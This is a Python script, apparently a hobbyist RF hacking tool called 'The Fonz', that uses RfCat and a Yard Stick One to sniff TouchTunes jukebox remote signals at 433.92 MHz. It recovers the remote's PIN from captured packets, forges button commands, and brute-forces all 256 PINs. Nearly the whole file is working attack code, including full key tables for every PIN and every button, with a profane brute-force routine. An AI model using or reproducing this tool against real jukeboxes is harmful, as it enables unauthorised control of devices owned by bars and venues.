#!/usr/bin/python
#
#The Fonz, a friendly TouchTunes Remote imulation tool used for finding PIN's, brute forcing, and genural jukebox control.
#TouchTunes remotes TX at 433.92Mhz, uses ASK/OOK and uses a pin (000-255) for "security". 
#This script was meant to be used with RfCat and the Yard Stick One.

#Here's an example of what the transmission looks like (in hex), on/off button with the PIN 000 
#==Preamble==  ==Key==  ==Message== ==?==
#ffff00a2888a2   aaaa   8888aa2aa22  20

#And the on/off button with PIN 255
#==Preamble==  ==Key==  ==Message== ==?==
#ffff00a2888a2 22222222 8888aa2aa22  20

#The message sometimes changes with the key but the key will be same regardless of the button pressed.  
#Here's an example of the on/off button with the pin 001
#==Preamble==  ==Key==  ==Message== ==?==
#ffff00a2888a2  2aaa    a2222a8aa88   88


#Based off of Michael Osman's code. https://greatscottgadgets.com/
#rflib and vstruct pulled from https://github.com/ecc1/rfcat
#Written by NotPike, Twitter @pyfurry


from rflib import *
import datetime
import time
import sys
import os


banner = """    _____ _            _____               
   |_   _| |__   ___  |  ___|__  _ __  ____
     | | | '_ \ / _ \ | |_ / _ \| '_ \|_  /
     | | | | | |  __/ |  _| (_) | | | |/ / 
     |_| |_| |_|\___| |_|  \___/|_| |_/___| V0.6

"Arthur, it's morning, have you been here all night?"
              Slect a number to begin!\n"""



###the ID Vender and ID Product of the YSO, used to restart if libusb fails
##from usb.core import find as finddev
##dev = finddev(idVendor=0x1d50, idProduct=0x605b)
##dev.reset()


#The D lol
d = RfCat()


#Values(keys) for each PIN, in order (000-255) when they are transited.
#ex. nukecode[0] ==  PIN 000, nukecode[50] == PIN 050, and nukecode[255] == PIN 255   
nukecodes = ['aaaa', '2aaa', '8aaa', '22aaa', 'a2aa', '28aaa', '88aaa', '222aa', '222aa', '2a2aa',
           '8a2aa', '228aa', 'a22aa', '288aa', '888aa', '2222aa', 'aa2a', '2a8aa', '8a8aa', '22a2a',
           'a28aa', '28a2a', '88a2a', '2228aa', 'a88aa', '2a22a', '8a22a', '2288aa', 'a222a', '2888aa',
           '8888aa', '22222a', 'aa8a', '2aa2a', '8aa2a', '22a8a', 'a2a2a', '28a8a', '88a8a', '222a2a',
           'a8a2a', '2a28a', '8a28a', '228a2a', 'a228a', '288a2a', '888a2a', '22228a', 'aa22a', '2a88a',
           '8a88a', '22a22a', 'a288a', '28a22a', '88a22a', '22288a', 'a888a', '2a222a', '8a222a', '22888a',
           'a2222a', '28888a', '88888a', '222222a', 'aaa2', '2aa8a', '8aa8a', '22aa2', 'a2a8a', '28aa2',
           '88aa2', '222a8a', 'a8a8a', '2a2a2', '8a2a2', '228a8a', 'a22a2', '288a8a', '888a8a', '2222a2',
           'aa28a', '2a8a2', '8a8a2', '22a28a', 'a28a2', '28a28a', '88a28a', '2228a2', 'a88a2', '2a228a',
           '8a228a', '2288a2', 'a2228a', '2888a2', '8888a2', '222228a', 'aa88a', '2aa22', '8aa22', '22a88a',
           'a2a22', '28a88a', '88a88a', '222a22', 'a8a22', '2a288a', '8a288a', '228a22', 'a2288a', '288a22',
           '888a22', '222288a', 'aa222', '2a888a', '8a888a', '22a222', 'a2888a', '28a222', '88a222', '222888a',
           'a8888a', '2a2222', '8a2222', '228888a', 'a22222', '288888a', '888888a', '2222222', 'aaa8', '2aaa2',
           '8aaa2', '22aa8', 'a2aa2', '28aa8', '88aa8', '222aa2', 'a8aa2', '2a2a8', '8a2a8', '228aa2', 'a22a8',
           '288aa2', '888aa2', '2222a8', 'aa2a2', '2a8a8', '8a8a8', '22a2a2', 'a28a8', '28a2a2', '88a2a2', '2228a8',
           'a88a8', '2a22a2', '8a22a2', '2288a8', 'a222a2', '2888a8', '8888a8', '22222a2', 'aa8a2', '2aa28', '8aa28',
           '22a8a2', 'a2a28', '28a8a2', '88a8a2', '222a28', 'a8a28', '2a28a2', '8a28a2', '228a28', 'a228a2', '288a28',
           '888a28', '22228a2', 'aa228', '2a88a2', '8a88a2', '22a228', 'a288a2', '28a228', '88a228', '22288a2',
           'a888a2', '2a2228', '8a2228', '22888a2', 'a22228', '28888a2', '88888a2', '2222228', 'aaa22', '2aa88',
           '8aa88', '22aa22', 'a2a88', '28aa22', '88aa22', '222a88', 'a8a88', '2a2a22', '8a2a22', '228a88', 'a22a22',
           '288a88', '888a88', '2222a22', 'aa288', '2a8a22', '8a8a22', '22a288', 'a28a22', '28a288', '88a288',
           '2228a22', 'a88a22', '2a2288', '8a2288', '2288a22', 'a22288', 'a28a22', '8888a22', '2222288', 'aa888',
           '2aa222', '8aa222', '22a888', 'a2a222', '28a888', '88a888', '222a222', 'a8a222', '2a2888', '8a2888',
           '228a222', 'a22888', '288a222', '888a222', '2222888', 'aa2222', '2a8888', '8a8888', '22a2222', 'a28888',
           '28a2222', '88a2222', '2228888', 'a88888', '2a22222', '8a22222', '2288888', 'a222222', '2888888',
           '8888888', '22222222']


#Both command values for each button
#Two Values for each command, it switches back and forth for each Key used 
KeyButton = [] #Global for commands's keys
commands = {'On_Off': ['8888aa2aa2220','a2222a8aa8888'], 'Pause': ['a22a288a88a20','a88a8a22a2288'],
        'P1': ['888aa8aa22220','a222aa2a88888'], 'P2_Edit_Queue': ['88aaa2a222220', 'a22aa8a888888'],
        'P3_Skip': ['22a28aa228a20','88a8a2a88a288'], 'F1_Restart': ['a2aa88a222220','a8aaa22888888'],
        'F2_Key': ['28aaa8a222220','8a2aaa2888888'], 'F3_Mic_A_Mute': ['a22aa22a22220','a88aa88a88888'],
        'F4_Mic_B_Mute': ['288aaa2a22220','8a22aa8a88888'], 'Mic_Vol_Plus_Up_Arrow': ['2222a2aa88a20','8888a8aaa2288'],
        'Mic_Vol_Minus_Down_Arrow': ['2aaaa22222220','8aaaa88888888'], 'A_Left_Arrow': ['2aa2a8888a220','8aa8aa2222888'],
        'B_Right_Arrow': ['22a8aa888a220','88aa2aa222888'], 'OK': ['8aa2a2888a220','a2a8a8a222888'],
        'Music_Vol_Zone_1Up': ['228aaa8a22220','88a2aaa288888'], 'Music_Vol_Zone_1Down': ['8a2aa28a22220','a28aa8a288888'],
        'Music_Vol_Zone_2Up': ['2a2aa88a22220','8a8aaa2288888'], 'Music_Vol_Zone_2Down': ['a8aa888a22220','aa2aa22288888'],
        'Music_Vol_Zone_3Up': ['22aaaa2222220','88aaaa8888888'], 'Music_Vol_Zone_3Down': ['8aaa8a2222220','a2aaa28888888'],
        '1': ['2222aaaa22220','8888aaaa88888'], '2': ['aa2a8888a2220','aa8aa22228888'], '3': ['2a8aa888a2220','8aa2aa2228888'],
        '4': ['8a8aa288a2220','a2a2a8a228888'], '5': ['22a2aa88a2220','88a8aaa228888'], '6': ['a28aa228a2220','a8a2a88a28888'],
        '7': ['28a2aa28a2220','8a28aa8a28888'], '8': ['88a2a8a8a2220','a228aa2a28888'], '9': ['2228aaa8a2220','888a2aaa28888'],
        '0': ['2a22aa22a2220','8a88aa88a8888'], 'Music_Karaoke': ['a88aa222a2220','aa22a888a8888'],
        'Lock_Queue': ['8a22a8a2a2220','a288aa28a8888']}


#Because I coun't figure out the corlation between the PINs and both commands used, I just hard coded it in order to chose the right command from the commands values
#0 refers to the 0 position in the value (list) in dictonary 'commands', 1 to the 1 position.
#ex. for key On_Off, value 0 == '8888aa2aa22200' and value 1 == 'a2222a8aa88880'
Wcommand = 0 #Global for WhichCommand
WhichCommand = [0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1,
                0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0,
                0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0,
                1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1,
                0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1,
                0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1,
                1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1,
                0, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0,
                0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1,
                0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0]


#Checks to see the packet receaved is valid
#looks for the preamble FFFF00A2888A2
#FFFF is cut off by d.setMdmSyncWord()
def VerifyPkt(pkt): 
        if ord(pkt[0]) != 0x00:
                return False
        if ord(pkt[1]) != 0xa2:
                return False
        if ord(pkt[2]) != 0x88:
                return False
        if ord(pkt[3]) != 0x8A:
                return False
        return True


#finds what the PIN is in a captured packet, not perfict because it may return mutable pins.
#TODO improve regex pattern so only 1 pin is returned
def PinFind(pkt, command):
        packet = str(pkt.encode('hex'))
        pin = 0
        PinValue = ''
        for nuke in nukecodes:
                try: #keeps the prgram from crashing if 'command' isn't returned as a posable value from the dictonary 'commands'
                        for value in commands[str(command)]: #compaires the 2 posable command values with the whole packet to find an exact PIN
                                if re.search(value, packet): #makes sure the command is in the packet
                                        PreNuke = '00a2888a2'+nuke+value #preamble plus the key and command
                                        if re.search(PreNuke, packet):
                                                if len(str(pin)) == 1:
                                                        PinValue = "00"+str(pin)
                                                        pin +=1
                                                elif len(str(pin)) == 2:
                                                        PinValue = "0"+str(pin)                                                
                                                        pin +=1
                                                elif len(str(pin)) == 3:
                                                        PinValue = (str(pin))
                                                        pin +=1
                                        else:
                                                pin +=1
                except KeyError:
                        pass
        return PinValue


#Find's wich command use in the captured packet, 
def CommandFind(pkt):
    packet = str(pkt.encode('hex'))
    for button in commands: #For each key in commands
        value = commands[str(button)] 
        for i in value: #Each value is a list of 2
            if re.search(i, packet):
                return str(button) #Once re returns true, it returns the current key from the loop


#Sets modes for the Yard Stick One and prints results
def Scan(d):
        d.setFreq(433.92e6)
        d.setMdmModulation(MOD_ASK_OOK)
        d.setMdmDRate(1766)
        d.setPktPQT(0)
        d.setMdmSyncMode(2)
        d.setMdmSyncWord(0x0000ffff) #FFFF is the beging of the preamble and won't be displayed, rflib assumes you know it's there when you set this variable.
        d.setMdmNumPreamble(0)
        d.makePktFLEN(16)

        print "-=Hit <ENTER> to stop=-"
        #while True:
        while not keystop():
                pkt, ts = d.RFrecv() #RX packet and timestamp
                try:
                        if VerifyPkt(pkt):
                                command = CommandFind(pkt)
                                pin = PinFind(pkt, command)
                                time = datetime.datetime.fromtimestamp(ts).strftime('%H:%M:%S')
                                packet = str(pkt.encode('hex'))
                                print "<*> %s: TX:ffff%s PIN:%s  Command: %s"  % (time,packet,pin,command) 

                except ChipconUsbTimeoutException:
                        pass
        null = raw_input() #Nulls enter for when you keystop, More of my bad scripting lol
        MainMenu()


def TX(data, repeat=0):
        d.setFreq(433.92e6)
        d.setMdmModulation(MOD_ASK_OOK)
        d.setMdmDRate(1766)
        d.setMdmNumPreamble(0) #Still sends a 16bit 101010 for the preamble...
        d.setMdmSyncMode(0)
        d.setMdmSyncWord(0)
        d.setMaxPower()
        d.RFxmit(data, repeat)
        print '<*> TX'


#Trys every PIN for a command
def BruteForceThisMotherFucker(CommandZero,CommandOne):

                        os.system('clear')
                        print "\n\"What day is today?\" asked Pooh"
                        time.sleep(1)
                        print "\"It's the day we burn this motherfucker to the ground.\" squeaked Piglet"
                        time.sleep(2)
                        print "\"My favorite day.\" said Pooh\n"
                        time.sleep(1.5)
                        print "<*> BRUTE FORCE IN PROGRESS..."

                        start = int(time.time())
                        PinCounter = 0
                        GroupCommand = '00'
                        for pin in nukecodes:
                                if WhichCommand[PinCounter] == 0:
                                        BruteCommand = CommandZero
                                else:
                                        BruteCommand = CommandOne
                                FullCommand = 'ffff00a2888a2'+pin+BruteCommand
                                if len(FullCommand) % 2 != 0: #Makes sure things are even
                                        FullCommand += '0'
                                
                                if len(GroupCommand) <= 255-len(FullCommand): #how many hex ch in 8bit
                                        #print FullCommand
                                        GroupCommand += FullCommand
                                        #print len(GroupCommand)
                                        PinCounter +=1

                                else:
                                        print GroupCommand + '\n'
                                        TX(GroupCommand.decode('hex'))
                                        GroupCommand = FullCommand
                                        PinCounter +=1


                        print GroupCommand + '\n'
                        stop = int(time.time())
                        TotalTime = stop-start
                        print "<*> BRUTE FORCE COMPLETE! TIME: %isec\n" %(TotalTime)
                        loop2 = False
                        MainMenu()
                        

def MainMenu():
        mainmenu = ''' -=Main Menu=-
1.) Scan
2.) TX
3.) Exit \n'''

        print mainmenu        
        loop = True
        while loop:
                try:
                        MenuAns=raw_input('Select [1-3]: ')
                        if int(MenuAns) == 1:
                                loop = False                                
                                Scan(d)
                        elif int(MenuAns) == 2:
                                loop = False
                                TxMenu()
                        elif int(MenuAns) == 3:
                                sys.exit()
                        else: 
                                print "Not a valid choice, please try again... \n"
                                time.sleep(.5)
                                
                except ValueError:
                        print "Not a valid choice, please try again... \n"
                        time.sleep(.5)
                        pass


#makes a reveresed list of commands and refrences it to the user's choice
def TxMenu():
        pin = PinMenu()
        if pin == 999:
                BruteMenu()
                MainMenu()
        command = CommandMenu()
        repeat = TimesMenu()

        FullCommand = 'ffff00a2888a2'+pin+command
        if len(FullCommand) % 2 != 0: #Makes sure string is even
                FullCommand = FullCommand+'0'

        loop = True
        while loop:
                print "\n<*> WARNING! YOU'RE ABOUT TO DO SOME COOL THINGS!"
                TxAns = raw_input("Are you cool like the Fonz to TX '"+FullCommand+"', '"+KeyButton+"' "+repeat+" times's? [Y/N]:")
                if str.lower(TxAns) == 'n':
                        loop = 0
                        MainMenu()
                elif str.lower(TxAns) == 'y':
                        Tx = True
                        while Tx:
                                print '<*> TXing...\n'
                                TX(FullCommand.decode('hex'), int(repeat)-1) #Dose the thing with the radio thin
                                ReTransmit = raw_input("TX Again? [Y/N]")
                                if str.lower(ReTransmit) == 'n':
                                        Tx = False
                                        MainMenu()
                                elif str.lower(ReTransmit) == 'y':
                                        Tx = True
                                else:
                                        Tx = False
                                        MainMenu()
                else:
                        print "\nNaw, you don goofed and you're not cool... Please try again thou! :D"
                        sys.exit()



def PinMenu():
        loop = True
        while loop:
                try:
                        PinAns=raw_input("Which PIN do you want to use? [000-255] [999 to Brute Force]: ")
                        if int(PinAns) <=255:
                                pin = nukecodes[int(PinAns)]
                                global Wcommand
                                Wcommand = WhichCommand[int(PinAns)] #choses between the 2 posable commands
                                loop = False
                                return pin
                        elif int(PinAns) == 999:
                                return int(PinAns)
                        else:
                                print "Not a valid choice, please try again... \n"
                                time.sleep(.5)     
                except ValueError:
                        print "Not a valid choice, please try again... \n"
                        time.sleep(.5)
                        pass


def CommandMenu():
        global KeyButton
        items = commands.keys()
        items.sort(reverse=1) #anti-alphabetical order
        choice = 0
        for button in items:
                choice +=1
                print '%i.) %s' %(choice, button)
        print '%i.) Back \n' %(choice+1)
        loop = True
        while loop:
                try:
                        CommandAns=raw_input('Pick a command. Select [1-%i]: ' %(choice+1))
                        if int(CommandAns) <= choice and int(CommandAns) >= 1:
                                KeyButton = items[int(CommandAns)-1] #the chosen command in the items list
                                value = commands[str(KeyButton)]
                                command = value[Wcommand]
                                loop = False
                                return command
                        elif int(CommandAns) == choice+1:
                                loop = False
                                MainMenu()
                        else:
                                print "Not a valid choice, please try again... \n"
                                time.sleep(.5)                                
                except ValueError:
                        print "Not a valid choice, please try again... \n"
                        time.sleep(.5)
                        pass
        


def TimesMenu():
        loop = True
        while loop:
                try:       
                        TimesAns=raw_input("TX how many times? [1-65535]: ")
                        if int(TimesAns) <= 65535:
                                        times = int(TimesAns)
                                        loop = False
                                        return str(times)
                        else: 
                                print "Not a valid choice, please try again... \n"
                                time.sleep(.5)                       

                except ValueError:
                        print "Not a valid choice, please try again... \n"
                        time.sleep(.5)
                        pass        


def BruteMenu():
       
        items = commands.keys()
        items.sort(reverse=1) #anti-alphabetical order
        choice = 0
        for button in items:
                choice +=1
                print '%i.) %s' %(choice, button)
        print '%i.) Back \n' %(choice+1)
        loop = True
        while loop:
                try:
                        CommandAns=raw_input('Pick a command. Select [1-%i]: ' %(choice+1))
                        if int(CommandAns) <= choice and int(CommandAns) >= 1:
                                KeyButton = items[int(CommandAns)-1] #the chosen command in the items list
                                value = commands[str(KeyButton)]
                                CommandZero = value[0]
                                CommandOne = value[1]
                                loop = False                                
                        elif int(CommandAns) == choice+1:
                                loop = False
                                MainMenu()
                        else:
                                print "Not a valid choice, please try again... \n"
                                time.sleep(.5)                                
                except ValueError:
                        print "Not a valid choice, please try again... \n"
                        time.sleep(.5)
                        pass

        loop2 = True
        while loop2:
                print "\n<*> WARNING! YOU'RE ABOUT TO DO SOME COOL THINGS!"
                TxAns = raw_input("Are you cool like the Fonz to brute force this thing? [Y/N]:")
                if str.lower(TxAns) == 'n':
                        loop2 = False
                        MainMenu()
                elif str.lower(TxAns) == 'y':
                        BruteForceThisMotherFucker(CommandZero,CommandOne)
                else:
                        print "\nNaw, you don goofed and you're not cool... Please try again thou! :D"
                        sys.exit()


if __name__ == '__main__':
        os.system('clear')
        print(banner)
        MainMenu()


